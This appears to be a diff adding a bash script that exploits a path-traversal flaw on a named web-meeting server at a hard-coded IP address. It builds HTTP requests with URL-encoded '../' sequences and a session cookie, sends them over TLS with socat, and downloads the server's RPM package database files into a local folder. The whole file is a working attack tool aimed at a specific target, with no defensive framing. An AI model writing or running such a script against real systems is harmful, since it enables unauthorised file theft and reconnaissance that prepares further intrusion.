@@ -1,0 +1,63 @@
+#!/bin/bash
+VSERVER="webmeeting.fostersgroup.com"
+TRAVERSAL="/common/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e"
+SERVER=203.32.17.2
+PORT=443
+
+PULL=pulled
+FILEZ=(
+    /var/lib/rpm/Packages
+    /var/lib/rpm/Name
+    /var/lib/rpm/__db.001
+    /var/lib/rpm/__db.002
+    /var/lib/rpm/__db.003
+    /var/lib/rpm/__db.004
+    /var/lib/rpm/DB_CONFIG
+)
+set -x
+function header() {
+    fn=$1
+    cat <<!
+GET ${TRAVERSAL}${fn} HTTP/1.1
+Host: ${VSERVER}
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20110429 Firefox/4.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+DNT: 1
+Connection: close
+Cookie: JSESSIONID=AC45625A23D37ADA7899B513D996EACB
+
+!
+}
+
+#"proxy:127.0.0.1:${SERVER}:${PORT},proxyport=6666" \
+mkdir -p ${PULL}
+for i in ${FILEZ[@]}; do
+    request="$(basename $i)"
+    response="${PULL}/${request}"
+    printf "Pulling %s..." ${request}
+    if [ ! -f "${response}" ]; then
+        exec 5< <(header ${i})
+        socat -4 \
+            "openssl:${SERVER}:${PORT},verify=0" \
+            "fd:5,ignoreeof"'!!'"open:${response},wronly=1,create=1,sync=1,noctty=0,trunc"
+        if [ $? -eq 0 ]; then
+            sync
+            if [ -s "${response}" ]; then
+                if grep -q 'Not found' "${response}"; then
+                    rm -f "${response}"
+                fi
+            else
+                rm -f "${response}"
+            fi
+        else
+            rm  -f "${response}"
+        fi
+        test -f "${response}" && echo "Done" || echo "Fail"
+        exec 5<&-
+    else
+        echo "Skipped"
+    fi
+done
